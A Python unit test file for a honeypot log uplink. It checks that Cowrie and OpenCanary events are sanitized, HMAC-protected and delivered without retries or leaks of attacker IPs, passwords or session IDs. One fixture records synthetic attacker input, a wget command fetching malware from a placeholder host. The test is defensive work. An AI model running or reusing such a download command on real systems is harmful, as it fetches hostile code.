"""Safe, isolated and loss-aware Worker protocol intake outbox tests.

All records and HTTP results are synthetic. No network or production tokens.
"""
import json
from pathlib import Path
import sqlite3
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0,str(Path(__file__).resolve().parent))
from durable_spool import spool,EvidenceError
from spool_uplink import inspect,reserve,settle,deliver,_summary

KEY="ci-only-evidence-key-"+"x"*45
INGEST="ci-only-independent-ingest-key-"+"z"*50


def cowrie(event="cowrie.session.connect"):
    return {
      "eventid":event,"protocol":"ssh","session":"private-session-id",
      "timestamp":"2026-11-19T12:00:00Z",
      "src_ip":"198.51.100.5","username":"SECRET_USER",
      "password":"SECRET_PASSWORD_123",
      "input":"wget https://private.invalid/malware",
    }


class UplinkTests(unittest.TestCase):
    def setUp(self):
        tmp=tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.home=Path(tmp.name)
        self.log=self.home/"local.jsonl"
        self.db=self.home/"restricted"/"spool.db"

    def log_events(self,*events,source="cowrie"):
        self.log.write_text("".join(json.dumps(v)+"\n" for v in events))
        summary=spool(self.log,self.db,source,"ci-sensor-01",KEY)
        return summary

    def test_inspection_does_not_create_delivery_table_or_network(self):
        self.log_events(cowrie())
        result=inspect(self.db,KEY)
        self.assertEqual(result["unsent"],1)
        self.assertTrue(result["readonly"])
        with sqlite3.connect(self.db) as db:
            self.assertIsNone(db.execute("""
              SELECT name FROM sqlite_master
              WHERE type='table' AND name='delivery_outbox'
            """).fetchone())

    def test_201_means_ack_only_and_no_duplicate_on_restart(self):
        self.log_events(cowrie(),cowrie("cowrie.login.success"))
        posted=[]
        def send(raw,key):
            self.assertEqual(key,INGEST)
            data=json.loads(raw)
            self.assertEqual(set(data),{
              "event_type","source","protocol","source_ip_hash",
              "country_code","request_path","action_taken"
            })
            self.assertIsNone(data["source_ip_hash"])
            self.assertEqual(data["event_type"],"suspicious_probe")
            posted.append(data)
            return 201
        result=deliver(self.db,KEY,INGEST,max_events=2,transport=send)
        self.assertEqual(result["insert_acknowledged_not_sql_verified"],2)
        self.assertFalse(result["production_tidb_readback_verified"])
        self.assertEqual(len(posted),2)
        self.assertEqual(deliver(self.db,KEY,INGEST,transport=send)
                         ["insert_acknowledged_not_sql_verified"],0)
        self.assertEqual(len(posted),2)
        status=inspect(self.db,KEY)
        self.assertEqual(status["outbox_states"]["insert_acknowledged"],2)
        for forbidden in ("PRIVATE", "SECRET", "198.51.100.5",
                          "private.invalid", "private-session-id"):
            self.assertNotIn(forbidden,self.db.read_bytes().decode("latin-1"))
            self.assertNotIn(forbidden,json.dumps(posted))

    def test_202_sampled_out_never_claims_ti_db_insert(self):
        self.log_events(cowrie())
        result=deliver(self.db,KEY,INGEST,transport=lambda raw,key:202)
        self.assertEqual(result["sampled_out_no_insert"],1)
        self.assertEqual(result["insert_acknowledged_not_sql_verified"],0)
        self.assertEqual(inspect(self.db,KEY)["outbox_states"]["sampled_out"],1)

    def test_503_fails_closed_and_blocks_subsequent_dispatch(self):
        self.log_events(cowrie(),cowrie("cowrie.login.failed"))
        received=[]
        def send(raw,key):
            received.append(json.loads(raw))
            return 503
        with self.assertRaisesRegex(EvidenceError,"review"):
            deliver(self.db,KEY,INGEST,max_events=2,transport=send)
        self.assertEqual(len(received),1)
        status=inspect(self.db,KEY)
        self.assertEqual(status["outbox_states"]["needs_review"],1)
        self.assertEqual(status["unsent"],1)
        with self.assertRaisesRegex(EvidenceError,"review"):
            deliver(self.db,KEY,INGEST,transport=send)
        self.assertEqual(len(received),1)

    def test_transport_uncertainty_never_auto_retries(self):
        self.log_events(cowrie())
        calls=[]
        def timeout(raw,key):
            calls.append(True)
            raise TimeoutError("sensitive byte should never print")
        with self.assertRaisesRegex(EvidenceError,"ambiguous delivery"):
            deliver(self.db,KEY,INGEST,transport=timeout)
        self.assertEqual(len(calls),1)
        self.assertEqual(inspect(self.db,KEY)["outbox_states"]["uncertain"],1)
        with self.assertRaises(EvidenceError):
            deliver(self.db,KEY,INGEST,transport=timeout)
        self.assertEqual(len(calls),1)

    def test_process_crash_after_reservation_is_not_retried(self):
        self.log_events(cowrie())
        ref,raw=reserve(self.db,KEY)
        self.assertEqual(json.loads(raw)["request_path"],"/ssh/connect")
        self.assertEqual(inspect(self.db,KEY)["outbox_states"]["reserved"],1)
        with self.assertRaises(EvidenceError):
            reserve(self.db,KEY)
        settle(self.db,KEY,ref,"uncertain")
        self.assertEqual(inspect(self.db,KEY)["outbox_states"]["uncertain"],1)

    def test_manual_forgery_or_bad_hmac_is_rejected(self):
        self.log_events(cowrie())
        reserve(self.db,KEY)
        with sqlite3.connect(self.db) as db:
            db.execute("UPDATE delivery_outbox SET status='insert_acknowledged'")
        with self.assertRaisesRegex(EvidenceError,"integrity"):
            inspect(self.db,KEY)
        with self.assertRaisesRegex(EvidenceError,"integrity"):
            reserve(self.db,KEY)

    def test_spool_source_tampering_rejected_before_network(self):
        self.log_events(cowrie())
        with sqlite3.connect(self.db) as db:
            db.execute("UPDATE sanitized_event SET payload_json='{}'")
        with self.assertRaisesRegex(EvidenceError,"HMAC"):
            reserve(self.db,KEY)
        with self.assertRaisesRegex(EvidenceError,"HMAC"):
            inspect(self.db,KEY)

    def test_opencanary_schema_maps_only_probe(self):
        log={
           "dst_port":13306,"logtype":1001,"src_host":"192.0.2.100",
           "timestamp":"2026-11-19T12:00:00Z",
           "password":"SENSOR_SECRET_PASS"
        }
        self.log_events(log,source="opencanary")
        emitted=[]
        deliver(self.db,KEY,INGEST,transport=lambda raw,key:
                (emitted.append(json.loads(raw)),202)[1])
        self.assertEqual(emitted[0]["request_path"],"/mysql/probe")
        self.assertEqual(emitted[0]["protocol"],"MYSQL")
        self.assertIsNone(emitted[0]["source_ip_hash"])
        self.assertNotIn("SENSOR_SECRET_PASS",json.dumps(emitted))

    def test_key_separation_and_event_caps(self):
        self.log_events(cowrie())
        with self.assertRaises(EvidenceError):
            deliver(self.db,KEY,"short")
        with self.assertRaises(EvidenceError):
            deliver(self.db,KEY,INGEST,max_events=100)
        with self.assertRaises(EvidenceError):
            inspect(self.db,"wrong")
        self.assertEqual(inspect(self.db,KEY)["unsent"],1)

    def test_unsupported_payload_fails_without_reservation(self):
        self.log_events(cowrie())
        with sqlite3.connect(self.db) as db:
            item=json.loads(db.execute("SELECT payload_json FROM sanitized_event").fetchone()[0])
        self.assertEqual(item["source"],"cowrie")
        # Reader mapping validates an exact protocol/class allowlist.
        item["protocol"]="MYSQL"
        with self.assertRaisesRegex(EvidenceError,"unrecognized"):
            self._bad_mapping(item)

    def _bad_mapping(self,item):
        import durable_spool
        payload=json.dumps(item,separators=(",",":"),sort_keys=True)
        mac=durable_spool._mac(KEY.encode(),"ci-sensor-01",item["event_ref"],payload)
        return _summary(item["event_ref"],"ci-sensor-01",payload,mac,KEY.encode())


if __name__=="__main__":
    unittest.main()
